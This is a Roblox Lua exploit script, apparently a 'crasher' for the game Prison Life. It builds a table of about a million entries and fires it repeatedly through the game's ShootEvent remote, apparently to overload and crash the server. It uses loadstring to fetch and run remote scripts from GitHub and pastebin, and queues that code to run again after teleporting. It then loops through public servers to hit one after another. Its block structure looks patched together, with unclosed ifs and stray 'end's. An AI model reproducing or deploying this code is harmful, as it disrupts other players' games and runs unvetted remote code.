function set(txt)status.Text=(txt)wait()end
local Z=Vector3.new()
local main={Hit=nil;Distance=0;Cframe=CFrame.new(Z,Z)*CFrame.new(0,0,0);RayObject=Ray.new(Z,Z);}
smallTable,biggerTable,EvenBiggerTable,KillTable = {},{},{},{};
for i=1,100 do
	for i=1,10 do table.insert(smallTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 0% <> "..tostring(i).."%")
	end
end 
for i=1,100 do
	for i=1,100 do table.insert(biggerTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 25% <> "..tostring(i).."%")
	end
end
for i=1,100 do
	for i=1,1000 do table.insert(EvenBiggerTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 50% <> "..tostring(i).."%")
	end
end
for i=1,100 do
	for i=1,10000 do table.insert(KillTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 75% <> "..tostring(i).."%")
	end
end
local remote = game:GetService("ReplicatedStorage").ShootEvent
local plr = game:GetService("Players").LocalPlayer
function getGun()
	local gun = plr.Backpack:FindFirstChild("M9") or plr.Character:FindFirstChild("M9")
	if gun then
		return gun
	else
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
		local gun = plr.Backpack:FindFirstChild("M9")
		return gun
	end
end
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(KillTable,gun)
		set("Fired "..#KillTable)
wait()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(KillTable,gun)
		set("Fired "..#KillTable)
wait()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(KillTable,gun)
		set("Fired "..#KillTable)
wait()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(KillTable,gun)
		set("Fired "..#KillTable)
local customTable = {}
function getT(amount)amount = math.floor(amount)
	if amount == #customTable then return end
	customTable = {}
	if amount <= 1000 then
		set("Creating table")
		for i=1,amount do
			table.insert(customTable,main)
		end
	else
		local x = math.floor(amount/100)
		for i=1,100 do
			local remainder = amount - x
			for i=1,x do table.insert(customTable,main)end
			if i/math.floor(i/10)/10 == 1 then
				set("Status Custom% <> "..tostring(i).."%")
			end
		end
		for i=1,amount-x do
			table.insert(customTable,main)
		end
	end
end
end
end
end
end
local stats = game:GetService("Stats")
local step = game:GetService("RunService").RenderStepped
local digits = 10
step:Connect(function()
	network.Text = tostring(math.floor(stats.DataSendKbps*digits)/digits).."KB/s"
end)
set("Status 100% Loaded")
queue_on_teleport([[
repeat game:GetService("RunService").RenderStepped:Wait()
until game.Players.LocalPlayer.Character:WaitForChild('Humanoid').Health == 100
loadstring(game:HttpGet("https://raw.githubusercontent.com/qcox/gothoes/main/prisonlife%20crasher",true))()
]])
loadstring(game:HttpGet("https://pastebin.com/raw/PiJXMBr6"))()(AltF4_PL.main)--drag
local prompt = assert(game:GetService("CoreGui"):FindFirstChild("promptOverlay", true), "Lol it should work :/")
assert(not prompt:FindFirstChild("ErrorPrompt"), prompt:FindFirstChild("ErrorPrompt") and wait(2) and game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer))
prompt.ChildAdded:Connect(function(child)
while wait() do
local HttpService, TPService = game:GetService("HttpService"), game:GetService("TeleportService")
local ServersToTP = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
for _, s in pairs(ServersToTP.data) do
   if s.playing ~= s.maxPlayers  and s.ping < 100 and s.id ~= game.JobId then
       TPService:TeleportToPlaceInstance(game.PlaceId, s.id)
   end
end
end
end)
